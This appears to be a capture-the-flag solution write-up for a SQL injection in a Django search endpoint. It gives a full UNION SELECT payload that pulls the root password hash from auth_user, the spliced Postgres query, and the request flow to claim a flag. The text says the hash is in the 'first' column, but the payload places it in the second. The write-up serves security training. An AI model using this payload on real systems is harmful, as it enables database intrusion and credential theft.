Put the whole injection in `q`. It has to (a) close the `LIKE` string literal,
(b) close the parenthesis Django wraps the extra `where` clause in, (c) add a
`UNION SELECT` with four columns whose first is the superuser hash, and (d)
comment out the trailing `%')` the sink leaves behind.

Target column: `password` in `auth_user`, for the row where `username='root'`.

Payload for `q`:

```
zzz') UNION SELECT NULL, password, NULL, NULL FROM auth_user WHERE username='root'--
```

After splicing (and the driver collapsing the doubled `%%` wildcards to `%`),
Postgres runs:

```sql
SELECT id, title, blurb, price_cents FROM app_product
WHERE (title LIKE '%zzz') UNION SELECT NULL, password, NULL, NULL FROM auth_user WHERE username='root'-- %')
```

`title LIKE '%zzz'` matches nothing, the `)` closes the wrapper paren, the
`UNION` appends one row whose first column is the `root` password hash (rendered
in the title cell), and `-- ` kills the dangling `%')`.

Full flow:

1. `GET /search?q=<payload>` (URL-encoded) — read the `pbkdf2_sha256$…` value out
   of the results table.
2. `POST /solve` with form field `hash=<that exact value>` — the JSON response
   returns your flag.

`tests/exploit.py` is the reference implementation of these two requests using
only `urllib`.
